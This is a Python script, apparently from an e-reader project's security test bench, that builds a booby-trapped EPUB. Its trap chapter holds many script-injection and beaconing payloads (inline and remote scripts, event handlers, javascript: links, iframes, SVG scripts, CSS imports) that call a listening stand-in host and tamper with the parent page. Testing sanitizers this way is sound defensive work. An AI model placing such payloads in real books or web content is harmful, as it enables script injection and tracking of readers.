#!/usr/bin/env python3
"""Fabrique l'EPUB piégé du banc de sécurité des livres (DECISIONS.md §127).

    python3 -I make-epub.py <sortie.epub> <origine-espion>

`origine-espion` est une adresse qu'on écoute (par exemple http://127.0.0.1:18999) : tout ce que le
livre réussirait à charger ou à exécuter y laisserait une ligne. Le livre est aussi un vrai livre —
deux chapitres de texte, une table des matières — pour que le lecteur l'ouvre normalement.
"""
import sys
import zipfile

out, spy = sys.argv[1], sys.argv[2].rstrip("/")

TRAP = f"""<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:xlink="http://www.w3.org/1999/xlink">
<head>
  <title>Chapitre piégé</title>
  <meta http-equiv="refresh" content="2;url={spy}/meta-refresh"/>
  <link rel="stylesheet" href="{spy}/link-stylesheet.css"/>
  <link rel="prefetch" href="{spy}/link-prefetch"/>
  <style>
    @import url("{spy}/css-import.css");
    h1 {{ background-image: url({spy}/css-url.png); }}
    @font-face {{ font-family: Espion; src: url({spy}/css-font.woff2); }}
    p.f {{ font-family: Espion; }}
  </style>
  <script>
    try {{ parent.document.documentElement.setAttribute("data-pwned", "inline-script"); }} catch (e) {{}}
    document.title = "PWNED";
    fetch("{spy}/inline-script-fetch").catch(function () {{}});
    fetch("/api/pwned-inline-script").catch(function () {{}});
  </script>
  <script src="{spy}/remote-script.js"></script>
</head>
<body onload="fetch('{spy}/body-onload'); try {{ parent.document.documentElement.setAttribute('data-pwned', 'onload') }} catch (e) {{}}">
  <h1 onclick="fetch('{spy}/onclick')">Chapitre piégé</h1>
  <p class="f">Ce chapitre essaie tout ce qu'un livre ne doit pas pouvoir faire. Rien de ce qui suit ne
  doit s'exécuter ni sortir de l'application.</p>
  <p><a id="lien-js" href="javascript:fetch('{spy}/javascript-link');parent.document.documentElement.setAttribute('data-pwned','js-link')">Un lien javascript</a></p>
  <p><a id="lien-externe" href="{spy}/external-link">Un lien externe</a></p>
  <p><a id="lien-interne" href="chapitre2.xhtml">Un lien vers le chapitre suivant</a></p>
  <img src="{spy}/img-src.png" alt="" onerror="fetch('{spy}/img-onerror')"/>
  <img src="{spy}/img-srcset.png" srcset="{spy}/img-srcset-2x.png 2x" alt=""/>
  <iframe src="{spy}/iframe"></iframe>
  <object data="{spy}/object"></object>
  <embed src="{spy}/embed"/>
  <video poster="{spy}/video-poster.png" src="{spy}/video.mp4"></video>
  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" onload="fetch('{spy}/svg-onload')">
    <script>fetch("{spy}/svg-script");</script>
    <image xlink:href="{spy}/svg-image.png" width="10" height="10"/>
  </svg>
  <p style="background: url('{spy}/style-attr.png')">Fin du chapitre piégé.</p>
</body>
</html>
"""

PROSE = " ".join(["Le texte continue ici, page après page, pour que le lecteur ait de quoi tourner."] * 40)
CH2 = f"""<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Chapitre 2</title></head>
<body><h1>Chapitre 2</h1><p>{PROSE}</p><p>{PROSE}</p></body></html>
"""

NAV = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>Table</title></head>
<body><nav epub:type="toc"><ol>
<li><a href="piege.xhtml">Chapitre piégé</a></li>
<li><a href="chapitre2.xhtml">Chapitre 2</a></li>
</ol></nav></body></html>
"""

OPF = """<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:5f0c1d2e-0000-4000-8000-livres-piege</dc:identifier>
    <dc:title>Livre piégé (banc de sécurité)</dc:title>
    <dc:creator>Banc de sécurité</dc:creator>
    <dc:language>fr</dc:language>
    <meta property="dcterms:modified">2026-10-28T00:00:00Z</meta>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="piege" href="piege.xhtml" media-type="application/xhtml+xml" properties="scripted svg"/>
    <item id="ch2" href="chapitre2.xhtml" media-type="application/xhtml+xml"/>
    <item id="js" href="evil.js" media-type="application/javascript"/>
  </manifest>
  <spine>
    <itemref idref="piege"/>
    <itemref idref="ch2"/>
  </spine>
</package>
"""

CONTAINER = """<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles>
</container>
"""

with zipfile.ZipFile(out, "w") as z:
    z.writestr(zipfile.ZipInfo("mimetype"), "application/epub+zip", compress_type=zipfile.ZIP_STORED)
    z.writestr("META-INF/container.xml", CONTAINER, compress_type=zipfile.ZIP_DEFLATED)
    z.writestr("OEBPS/content.opf", OPF, compress_type=zipfile.ZIP_DEFLATED)
    z.writestr("OEBPS/nav.xhtml", NAV, compress_type=zipfile.ZIP_DEFLATED)
    z.writestr("OEBPS/piege.xhtml", TRAP, compress_type=zipfile.ZIP_DEFLATED)
    z.writestr("OEBPS/chapitre2.xhtml", CH2, compress_type=zipfile.ZIP_DEFLATED)
    z.writestr("OEBPS/evil.js", f'fetch("{spy}/manifest-script");', compress_type=zipfile.ZIP_DEFLATED)
# Le chapitre brut, à côté : le banc l'affiche aussi sans passer par le nettoyage, pour éprouver seules
# les deux autres barrières (cadre sans `allow-scripts`, politique de la page).
with open(out + ".xhtml", "w", encoding="utf-8") as f:
    f.write(TRAP)
print(out)
